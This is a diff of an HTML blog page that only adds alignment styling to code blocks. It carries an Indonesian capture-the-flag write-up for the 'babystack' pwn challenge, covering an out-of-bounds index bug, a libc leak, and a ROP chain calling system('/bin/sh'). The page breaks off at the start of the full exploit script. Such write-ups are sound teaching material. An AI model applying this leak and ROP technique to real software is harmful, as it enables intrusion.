@@ -126,7 +126,7 @@
     <div align="start" class="content"><p>hint:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">overwriting return address by overflowing the boundary
 </code></pre></div><p>Diberikan file ELF dengan proteksi sebagai berikut:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">@m00n ➜ babystack git:(master) ✗ checksec main
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">@m00n ➜ babystack git:(master) ✗ checksec main
 [*] &#39;/home/bintang/CTF/unity2020/pwn/babystack/main&#39;
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -134,7 +134,7 @@
     NX:       NX enabled
     PIE:      PIE enabled
 </code></pre></div><p>ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">add_book</span>(<span style="color:#66d9ef">__int64</span> a1)
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">add_book</span>(<span style="color:#66d9ef">__int64</span> a1)
 {
   <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
 </span><span style="color:#75715e"></span>
@@ -146,7 +146,7 @@
   <span style="color:#66d9ef">return</span> read_wrapper(<span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1, <span style="color:#ae81ff">29LL</span>);
 }
 </code></pre></div><p>Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu. Tapi overwrite kemana? fungsi main tidak akan pernah melakukan return, karena adanya fungsi <code>exit(1)</code> jika ingin keluar. Berikut adalah fungsi <code>main</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight style=" text-align: left""><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
 {
   <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rdi
 </span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
@@ -216,7 +216,7 @@ LABEL_13:
 }
 </code></pre></div><p>Kita tidak akan bisa mengontrol saved RIP fungsi <code>main</code>. Namun kita bisa mengoverwrite saved RIP fungsi lain, bagaimana caranya? yaitu dengan menggunakan index kurang dari 0. Jika fungsi <code>main</code> memanggil fungsi yang lain, stack frame fungsi main akan berada dibawah fungsi yang dipanggil (walaupun sebenarnya alamat stack frame fungsi <code>main</code> lebih tinggi dari fungsi yang dipanggil). Karena itulah kita menggunakan index kurang dari 0 untuk mengoverwrite saved RIP.
 Agar mempermudah, berikut beberapa fungsi yang dibuat:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>(index):
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>(index):
 	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
 	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
 
@@ -241,7 +241,7 @@ Agar mempermudah, berikut beberapa fungsi yang dibuat:</p>
   <span style="color:#66d9ef">return</span> v3;
 }
 </code></pre></div><p>Jika kita menggunakan <code>'\n'</code>, kita tidak akan bisa meleak karena <code>printf()</code> akan mencetak output sampai ditemukannya NULL. Berikut fungsi <code>print_book</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_book</span>(<span style="color:#66d9ef">__int64</span> a1)
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_book</span>(<span style="color:#66d9ef">__int64</span> a1)
 {
   <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
 </span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
@@ -258,7 +258,7 @@ Agar mempermudah, berikut beberapa fungsi yang dibuat:</p>
   <span style="color:#66d9ef">return</span> result;
 }
 </code></pre></div><p>berikut kode untuk leaknya:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
 print_(<span style="color:#ae81ff">8</span>)
 p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
 leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">16</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
@@ -271,13 +271,13 @@ leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</sp
 libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20830</span>
 </code></pre></div><h2 id="shell">#shell</h2>
 <p>Agar bisa mendapatkan shell ada beberapa kemungkinan exploit yang digunakan, antara lain menggunakan one gadget atau jump ke <code>system(&quot;/bin/sh&quot;)</code>. Namun saya telah mencoba untuk menggunakan one gadget tetapi tidak bisa, jadi saya menggunakan alternatif lain yaitu jump ke <code>system(&quot;/bin/sh&quot;)</code>. Saya menggunakan ROP chain yang ditempatkan di index -3 dan akan mengoverwrite saved RIP dari fungsi <code>read_wrapper</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#75715e"># padding</span>
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#75715e"># padding</span>
 payload <span style="color:#f92672">+=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000df3</span>) <span style="color:#75715e"># pop rdi; ret;</span>
 payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)))
 payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
 add(<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>, payload)
 </code></pre></div><p>berikut full exploitnya:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight" style=" text-align: left"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> sys
 
 BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./main&#39;</span>
